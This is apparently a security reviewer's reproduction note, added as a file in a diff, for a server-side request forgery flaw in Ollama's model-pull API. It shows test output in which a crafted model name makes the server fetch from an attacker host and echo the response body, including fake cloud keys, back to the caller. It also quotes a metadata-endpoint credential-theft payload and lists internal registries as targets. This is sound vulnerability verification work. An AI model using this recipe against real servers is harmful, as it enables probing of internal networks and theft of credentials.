@@ -1,0 +1,53 @@
+Adversarial reproduction of p8-002-api-pull-ssrf
+==================================================
+
+Method: in-process Go integration test against current tree (main branch,
+commit 57653b8e). A test file was temporarily placed at
+server/ssrf_adversarial_test.go that:
+  1. Spins up a local httptest server simulating an internal target that
+     returns HTTP 500 with a body containing "AKIA_STOLEN / STOLEN_SECRET".
+  2. Builds a model.Name from "<host>:<port>/ns/model:tag".
+  3. Confirms n.IsValid() == true (host is accepted by isValidPart(kindHost)).
+  4. Invokes pullModelManifest(ctx, n, &registryOptions{Insecure: true}).
+  5. Captures the outbound request on the attacker listener.
+  6. Captures the error returned upstream to the API caller.
+
+Command:
+  go test -vet=off ./server/ -run TestSSRFAdversarial -v
+
+Observed output:
+
+=== RUN   TestSSRFAdversarial_PullManifestToAttackerHost
+    crafted name "127.0.0.1:60663/ns/model:tag" -> host="127.0.0.1:60663" ns="ns" model="model" tag="tag" scheme="https"
+    outbound request: GET /v2/ns/model/manifests/tag (Host=127.0.0.1:60663)
+    error string returned to /api/pull caller: 500: {"AccessKeyId":"AKIA_STOLEN","SecretAccessKey":"STOLEN_SECRET"}
+    wrapped error: pull model manifest: 500: {"AccessKeyId":"AKIA_STOLEN","SecretAccessKey":"STOLEN_SECRET"}
+    PASS: attacker host received outbound request AND response body was reflected back to API caller
+--- PASS: TestSSRFAdversarial_PullManifestToAttackerHost (0.00s)
+PASS
+ok  github.com/ollama/ollama/server
+
+Interpretation:
+  - Attacker-controlled host (including IP literal per isValidPart(kindHost)
+    at types/model/name.go:344-372) is embedded in the outbound URL with
+    no destination allowlist, no private/link-local/loopback filter.
+  - Insecure:true downgrades the scheme to http at server/images.go:952-954.
+  - The response body is surfaced verbatim into the error propagated back to
+    the /api/pull caller via fmt.Errorf at server/images.go:921-927 and the
+    outer wrapper at server/images.go:622-623.
+
+Caveats:
+  - The original finding's raw PoC JSON
+      {"name":"169.254.169.254/latest/meta-data/iam/security-credentials/default:x",...}
+    does NOT parse to a valid model.Name because excess "/" is absorbed into
+    the host part which then fails isValidPart (no "/" allowed inside host).
+    Attacker has to use a 3-part form "HOST/NS/MODEL:TAG". The HTTP path
+    sent is always /v2/{ns}/{model}/manifests/{tag}; attacker does not
+    control the URL path suffix. This limits direct IMDSv1 credential
+    retrieval (which requires specific path /latest/meta-data/...).
+  - However, the same flow is fully unrestricted against any internal HTTP
+    service that responds on /v2/*/manifests/* or on any path that yields
+    sensitive content under 4xx/5xx (internal container registries, Harbor,
+    Nexus, and other docker-distribution v2 endpoints are especially
+    vulnerable). Probing, fingerprinting, and response-body leakage for
+    private / loopback targets are all confirmed via the reflected error.
